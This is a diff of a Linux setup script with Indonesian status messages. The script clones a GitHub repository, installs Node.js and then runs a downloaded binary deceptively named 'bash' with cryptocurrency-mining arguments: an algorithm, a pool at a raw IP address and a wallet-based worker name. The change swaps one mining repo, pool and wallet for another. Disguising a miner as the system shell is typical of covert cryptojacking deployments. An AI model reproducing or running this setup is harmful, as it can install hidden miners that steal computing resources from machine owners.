@@ -10,10 +10,10 @@ echo "== Install Git =="
 sudo apt install -y git
 
 echo "== Clone Repository =="
-git clone https:////x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/gm.git
+git clone https://github.com/hujisanda/lol198.git
 
 echo "== Masuk Folder =="
-cd gm || { echo "Folder tidak ditemukan"; exit 1; }
+cd lol198 || { echo "Folder tidak ditemukan"; exit 1; }
 
 echo "== Install NodeJS & NPM =="
 sudo apt install -y nodejs npm
@@ -31,4 +31,4 @@ echo "== Permission File bash =="
 chmod u+x bash
 
 echo "== Menjalankan ./bash =="
-./bash -a beamhash --ssl 1 -s 167.71.108.251:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin -p x
+./bash --algo FISHHASH --pool 134.209.175.114:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
